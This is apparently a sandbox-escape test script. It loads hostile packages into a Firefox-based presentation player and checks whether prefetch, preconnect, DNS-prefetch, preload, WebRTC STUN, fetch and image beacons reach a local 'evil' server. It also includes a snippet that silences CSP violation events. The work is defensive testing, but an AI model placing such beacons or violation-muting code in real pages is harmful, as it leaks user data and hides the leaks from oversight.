// F6: network channels from a hostile package in Firefox. HTTP attacker :4741, TCP :4742, UDP STUN :4743.
// Each channel in its own package; also a control run of the same snippet in an ordinary (non-sandboxed, no-CSP) page.
const fs=require('node:fs'),path=require('node:path');
const FF=require('./ff.cjs'); const L=require('./lib.cjs');
const E='http://127.0.0.1:4741';
const mute=`window.__v=[];window.addEventListener('securitypolicyviolation',e=>{window.__v.push(e.effectiveDirective+' <- '+e.blockedURI);e.stopImmediatePropagation()},true);window.addEventListener('error',e=>{e.stopImmediatePropagation();e.preventDefault()},true);window.addEventListener('unhandledrejection',e=>{e.stopImmediatePropagation();e.preventDefault()},true);`;
const link=(rel,href)=>`{const l=document.createElement('link');l.rel='${rel}';l.href='${href}';document.head.append(l);}`;
const ch={
 prerender:link('prerender',E+'/prerender?d=1'),
 prefetch:link('prefetch',E+'/prefetch?d=1'),
 preconnect:link('preconnect','http://127.0.0.1:4742/'),
 'dns-prefetch':link('dns-prefetch','http://x2-dnsprefetch-probe.invalid/'),
 preload:link('preload',E+'/preload.js')+`document.head.lastChild.as='script';`,
 stun:`(async()=>{try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:4743'}]});pc.createDataChannel('x');await pc.setLocalDescription(await pc.createOffer());window.__rtc='offer-set'}catch(e){window.__rtc='ERR '+e.name+': '+e.message}})();`,
 fetch:`fetch('${E}/fetch?d=1').then(()=>window.__f='ok',e=>window.__f='ERR '+e.message);`,
 img:`{const i=new Image();i.src='${E}/img.png?d=1';document.body.append(i);}`,
};
const page=(s)=>`<!doctype html><html><head></head><body><h1>net probe</h1><script>${mute}${s}</script></body></html>`;
(async()=>{
 const extra={}; for(const [k,s] of Object.entries(ch)) extra['/__x2/ctl-'+k+'.html']={type:'text/html',body:page(s)};
 const site=await L.startSite(4740,extra); const evil=await L.startEvil(4741); const tcp=await L.startTcp(4742); const udp=await L.startUdp(4743);
 const out={}; const b=await FF.launch(); out.version=b.version();
 const got=(h0,t0,u0)=>({http:evil.log.slice(h0).map(x=>x.method+' '+x.url+' dest='+x.dest),tcp:tcp.log.slice(t0).length,udp:udp.log.slice(u0).length});
 try{
  for(const [k,s] of Object.entries(ch)){
   const r={};
   // sandboxed player
   let ctx=await b.newContext(); let p=await ctx.newPage();
   await L.openWorkspace(p,'http://127.0.0.1:4740/');
   await L.openFile(p,L.makePackage(page(s)),'n.zip');
   await p.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
   let h0=evil.log.length,t0=tcp.log.length,u0=udp.log.length;
   await p.locator('[data-pres-start-button]').click(); await L.sleep(5000);
   const f=L.appFrame(p); const st=await L.dialogState(p);
   r.player={status:st.status,notice:st.notice,...got(h0,t0,u0),inner:f?await f.evaluate(()=>({v:window.__v,rtc:window.__rtc,f:window.__f})).catch(e=>'err '+e.message):null};
   await ctx.close();
   // control: ordinary page, no sandbox, no CSP
   ctx=await b.newContext(); p=await ctx.newPage(); h0=evil.log.length;t0=tcp.log.length;u0=udp.log.length;
   await p.goto('http://127.0.0.1:4740/__x2/ctl-'+k+'.html'); await L.sleep(5000);
   r.control={...got(h0,t0,u0),inner:await p.evaluate(()=>({rtc:window.__rtc,f:window.__f}))};
   await ctx.close();
   out[k]=r; console.log(k,JSON.stringify(r));
  }
 } finally { await b.close(); await site.close(); await evil.close(); await tcp.close(); await udp.close(); fs.writeFileSync(path.join(__dirname,'logs','f6.json'),JSON.stringify(out,null,2)); }
})();
